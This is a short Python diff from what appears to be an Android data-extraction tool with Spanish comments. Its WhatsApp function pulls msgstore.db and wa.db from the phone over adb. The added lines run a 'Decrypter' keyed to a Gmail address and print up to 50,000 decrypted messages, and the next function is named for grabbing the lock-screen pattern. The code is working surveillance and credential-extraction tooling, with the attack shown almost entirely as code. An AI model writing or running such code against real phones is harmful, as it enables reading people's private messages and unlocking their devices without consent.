@@ -45,14 +45,15 @@ def grab_whatssap_from_phone():
     os.system('''adb pull /data/data/com.whatsapp/databases/msgstore.db dump''')
     os.system('''adb pull /data/data/com.whatsapp/databases/wa.db dump''')
     print("Guardado en nuestro barco (carpeta dump) abrir con Sqlite Browser")
-    #con = sqlite3.connect('dump/msgstore.db')
-    #with con:
-    #    cur = con.cursor()
-    #    cur.execute("SELECT `_rowid_`,* FROM `messages`  ORDER BY `timestamp` DESC LIMIT 0, 50000")
-    #    rows = cur.fetchall()
-    #    for row in rows:
-    #        print str(row)
-    #con.close()
+    os.system('python Decrypter dump/msgstore.db prueba@gmail.com > dump/decrypted.db')
+    con = sqlite3.connect('dump/decrypted.db')
+    with con:
+        cur = con.cursor()
+        cur.execute("SELECT `_rowid_`,* FROM `messages`  ORDER BY `timestamp` DESC LIMIT 0, 50000")
+        rows = cur.fetchall()
+        for row in rows:
+            print str(row)
+    con.close()
 
 def grab_pattern_from_phone():
     #pillar patron de bloqueo
